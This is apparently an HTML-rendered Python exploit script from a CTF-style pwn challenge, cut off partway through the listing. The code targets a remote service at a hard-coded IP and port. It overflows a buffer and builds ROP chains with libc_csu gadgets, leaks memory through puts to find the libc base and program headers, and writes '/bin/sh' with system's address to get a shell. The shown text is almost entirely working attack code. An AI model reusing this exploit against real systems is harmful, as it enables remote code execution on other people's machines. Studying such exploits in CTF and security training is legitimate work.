alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div><div class="line number136 index135 alt1">136</div><div class="line number137 index136 alt2">137</div><div class="line number138 index137 alt1">138</div><div class="line number139 index138 alt2">139</div><div class="line number140 index139 alt1">140</div><div class="line number141 index140 alt2">141</div><div class="line number142 index141 alt1">142</div><div class="line number143 index142 alt2">143</div><div class="line number144 index143 alt1">144</div><div class="line number145 index144 alt2">145</div><div class="line number146 index145 alt1">146</div><div class="line number147 index146 alt2">147</div><div class="line number148 index147 alt1">148</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">zio&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number2 index1 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">pwnlib.dynelf&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number3 index2 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">pwnlib.elf&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python keyword">*</code></div><div class="line number4 index3 alt1"><code class="python plain">io&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">zio((</code><code class="python string">'119.28.63.211'</code><code class="python plain">,&nbsp;</code><code class="python value">2332</code><code class="python plain">),&nbsp;print_read&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'red'</code><code class="python plain">),&nbsp;print_write&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">COLORED(</code><code class="python functions">REPR</code><code class="python plain">,&nbsp;</code><code class="python string">'blue'</code><code class="python plain">),&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">100000</code><code class="python plain">)</code></div><div class="line number5 index4 alt2"><code class="python comments">#&nbsp;io&nbsp;=&nbsp;zio(('119.28.63.211',&nbsp;2332),&nbsp;print_read&nbsp;=&nbsp;False,&nbsp;print_write&nbsp;=&nbsp;False,&nbsp;timeout&nbsp;=&nbsp;10000)</code></div><div class="line number6 index5 alt1"><code class="python comments">#&nbsp;io.hint([0x4006b7])</code></div><div class="line number7 index6 alt2"><code class="python plain">got_read&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601028</code></div><div class="line number8 index7 alt1"><code class="python plain">got_puts&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601018</code></div><div class="line number9 index8 alt2"><code class="python plain">plt_puts&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x400500</code></div><div class="line number10 index9 alt1"><code class="python plain">adr_bss&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x601000</code></div><div class="line number11 index10 alt2"><code class="python plain">p_rdi_ret&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x00400763</code></div><div class="line number12 index11 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">prepare(address):</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x48</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(p_rdi_ret)</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(address)</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(plt_puts)</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x400550</code><code class="python plain">)&nbsp;</code><code class="python comments">#&nbsp;program&nbsp;entry</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload)</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rtl(</code><code class="python string">'bye~\n'</code><code class="python plain">)</code></div><div class="line number21 index20 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">com_gadget(part1,&nbsp;part2,&nbsp;jmp2,&nbsp;arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,&nbsp;arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">):</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part1)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part1&nbsp;entry&nbsp;pop_rbx_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x0</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbx&nbsp;be&nbsp;0x0</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x1</code><code class="python plain">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;rbp&nbsp;be&nbsp;0x1</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(jmp2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r12&nbsp;jump&nbsp;to</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg3)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r13&nbsp;-&gt;&nbsp;rdx&nbsp;&nbsp;&nbsp;&nbsp;arg3</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg2)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r14&nbsp;-&gt;&nbsp;rsi&nbsp;&nbsp;&nbsp;&nbsp;arg2</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(arg1)&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;r15&nbsp;-&gt;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;arg1</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(part2)&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;part2&nbsp;entry&nbsp;will&nbsp;call&nbsp;[rbx&nbsp;+&nbsp;r12&nbsp;+&nbsp;0x8]</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">56</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code class="python comments">#&nbsp;junk</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">payload</code></div><div class="line number32 index31 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">getshell(adr_system):</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x48</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(</code><code class="python value">0x40075a</code><code class="python plain">,&nbsp;</code><code class="python value">0x400740</code><code class="python plain">,&nbsp;jmp2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">got_read,</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x0</code><code class="python plain">,</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x80</code><code class="python plain">,</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg3&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code><code class="python plain">)</code></div><div class="line number38 index37 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0x400550</code><code class="python plain">)&nbsp;</code><code class="python comments">#&nbsp;program&nbsp;entry</code></div><div class="line number39 index38 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number40 index39 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload)</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rtl(</code><code class="python string">'bye~\n'</code><code class="python plain">)</code></div><div class="line number42 index41 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(</code><code class="python string">'/bin/sh\x00'</code>&nbsp;<code class="python keyword">+</code>&nbsp;<code class="python plain">l64(adr_system))</code></div><div class="line number43 index42 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python string">'A'</code>&nbsp;<code class="python keyword">*</code>&nbsp;<code class="python value">0x48</code></div><div class="line number44 index43 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">com_gadget(</code><code class="python value">0x40075a</code><code class="python plain">,&nbsp;</code><code class="python value">0x400740</code><code class="python plain">,&nbsp;jmp2&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x88</code><code class="python plain">,</code></div><div class="line number45 index44 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">arg1&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">adr_bss&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x80</code><code class="python plain">)</code></div><div class="line number46 index45 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(</code><code class="python value">0xdeadbeef</code><code class="python plain">)</code></div><div class="line number47 index46 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">payload&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">payload.ljust(</code><code class="python value">0xc8</code><code class="python plain">,&nbsp;</code><code class="python string">'A'</code><code class="python plain">)</code></div><div class="line number48 index47 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.w(payload)</code></div><div class="line number49 index48 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">io.rtl(</code><code class="python string">'bye~\n'</code><code class="python plain">)</code></div><div class="line number50 index49 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">leak(address,&nbsp;size):</code></div><div class="line number51 index50 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">count&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0</code></div><div class="line number52 index51 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">''</code></div><div class="line number53 index52 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python plain">count&nbsp;&lt;&nbsp;size:</code></div><div class="line number54 index53 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">prepare(address&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">count)</code></div><div class="line number55 index54 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;leak(str(address&nbsp;+&nbsp;count))</code></div><div class="line number56 index55 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number57 index56 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">ch&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">io.read(</code><code class="python value">1</code><code class="python plain">,&nbsp;timeout&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x10</code><code class="python plain">)</code></div><div class="line number58 index57 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;ch</code></div><div class="line number59 index58 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">count&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python value">1</code></div><div class="line number60 index59 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">ch&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\n'</code><code class="python plain">:</code></div><div class="line number61 index60 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\x00'</code></div><div class="line number62 index61 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number63 index62 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number64 index63 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">buf&nbsp;</code><code class="python keyword">+</code><code class="python keyword">=</code>&nbsp;<code class="python plain">ch[</code><code class="python value">0</code><code class="python plain">]</code></div><div class="line number65 index64 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">leak_data&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">buf[:size]</code></div><div class="line number66 index65 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#print&nbsp;'{}&nbsp;==&gt;&nbsp;{}'.format(hex(address),&nbsp;leak_data.encode('hex'))</code></div><div class="line number67 index66 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">leak_data</code></div><div class="line number68 index67 alt1"><code class="python comments">#&nbsp;manual&nbsp;leak&nbsp;libc</code></div><div class="line number69 index68 alt2"><code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code></div><div class="line number70 index69 alt1"><code class="python comments">#&nbsp;get&nbsp;arbitrary&nbsp;address&nbsp;located&nbsp;in&nbsp;libc</code></div><div class="line number71 index70 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">get_elf_entry(got):</code></div><div class="line number72 index71 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">entry&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(got,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))</code></div><div class="line number73 index72 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;libc&nbsp;entry\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">entry</code></div><div class="line number74 index73 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">entry</code></div><div class="line number75 index74 alt2"><code class="python comments">#&nbsp;find&nbsp;libc&nbsp;base&nbsp;according&nbsp;to&nbsp;Magic</code></div><div class="line number76 index75 alt1"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_elf_base(entry):</code></div><div class="line number77 index76 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number78 index77 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">libc_base&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">entry&nbsp;&amp;&nbsp;</code><code class="python value">0xfffffffffffff000</code></div><div class="line number79 index78 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code>&nbsp;<code class="python color1">True</code><code class="python plain">:</code></div><div class="line number80 index79 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">leak(libc_base,&nbsp;</code><code class="python value">0x4</code><code class="python plain">)</code></div><div class="line number81 index80 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">garbage&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python string">'\x7fELF'</code><code class="python plain">:</code></div><div class="line number82 index81 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">break</code></div><div class="line number83 index82 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">libc_base&nbsp;</code><code class="python keyword">-</code><code class="python keyword">=</code>&nbsp;<code class="python value">0x1000</code></div><div class="line number84 index83 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;libc&nbsp;base\t\t\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">libc_base</code></div><div class="line number85 index84 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code class="python plain">libc_base</code></div><div class="line number86 index85 alt1"><code class="python comments">#&nbsp;find&nbsp;program&nbsp;header&nbsp;table</code></div><div class="line number87 index86 alt2"><code class="python keyword">def</code>&nbsp;<code class="python plain">find_phdr(elf_base):</code></div><div class="line number88 index87 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code>&nbsp;<code class="python plain">BITS&nbsp;</code><code class="python keyword">=</code><code class="python keyword">=</code>&nbsp;<code class="python value">64</code><code class="python plain">:</code></div><div class="line number89 index88 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">#&nbsp;get&nbsp;address&nbsp;of&nbsp;program&nbsp;header&nbsp;table</code></div><div class="line number90 index89 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">phdr&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">l64(leak(elf_base&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python value">0x20</code><code class="python plain">,&nbsp;</code><code class="python value">0x8</code><code class="python plain">))&nbsp;</code><code class="python keyword">+</code>&nbsp;<code class="python plain">elf_base</code></div><div class="line number91 index90 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">print</code>&nbsp;<code class="python string">'[+]&nbsp;program&nbsp;headers&nbsp;table\t\t:\t0x%x'</code>&nbsp;<code class="python keyword">%</code>&nbsp;<code class="python plain">phdr</code></div><div class="line number92 index91 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code>&nbsp;<code 